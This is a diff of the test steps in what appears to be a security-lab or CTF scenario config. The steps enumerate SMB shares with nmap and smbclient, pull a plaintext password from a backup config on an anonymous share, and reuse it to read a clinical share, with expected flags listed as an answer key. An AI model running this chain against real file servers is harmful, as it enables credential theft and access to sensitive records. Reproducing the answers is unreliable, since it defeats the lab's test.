@@ -79,27 +79,27 @@ topology:
 test:
   steps:
     - name: "SMB port is accessible"
-      command: "nmap -p 445 --open {target.target} 2>/dev/null | grep -c '445.*open'"
+      command: "nmap -p 445 --open {target.target} 2>&1 | grep -c '445.*open'"
       expect: "1"
       timeout: 15
 
     - name: "List SMB shares anonymously"
-      command: "smbclient -L //{target.target} -N 2>/dev/null | grep -c Disk"
+      command: "smbclient -L //{target.target} -N 2>&1 | grep -c Disk"
       expect: "3"
       timeout: 15
 
     - name: "Access public share and extract token 1"
-      command: "smbclient //{target.target}/public -N -c 'get it_notes.txt /tmp/smb_itnotes.txt' 2>/dev/null && grep -o 'audit_token=[^ ]*' /tmp/smb_itnotes.txt | cut -d= -f2"
+      command: "smbclient //{target.target}/public -N -c 'get it_notes.txt /tmp/smb_itnotes.txt' 2>&1 && grep -o 'audit_token=[^ ]*' /tmp/smb_itnotes.txt | cut -d= -f2"
       expect: "smb_hunt"
       timeout: 15
 
     - name: "Access records share and find credentials"
-      command: "smbclient //{target.target}/records -N -c 'get backup_config.ini /tmp/smb_config.txt' 2>/dev/null && grep 'password' /tmp/smb_config.txt | sed 's/.*= *//' | head -1"
+      command: "smbclient //{target.target}/records -N -c 'get backup_config.ini /tmp/smb_config.txt' 2>&1 && grep 'password' /tmp/smb_config.txt | sed 's/.*= *//' | head -1"
       expect: "H4rgr0v3_M3d#"
       timeout: 15
 
     - name: "Use credentials to access clinical share and get token 2"
-      command: "smbclient //{target.target}/clinical -U medsvc%H4rgr0v3_M3d# -c 'get assessment_marker.txt /tmp/smb_marker.txt' 2>/dev/null && cat /tmp/smb_marker.txt"
+      command: "smbclient //{target.target}/clinical -U medsvc%H4rgr0v3_M3d# -c 'get assessment_marker.txt /tmp/smb_marker.txt' 2>&1 && cat /tmp/smb_marker.txt"
       expect: "cr3ds"
       timeout: 15
 
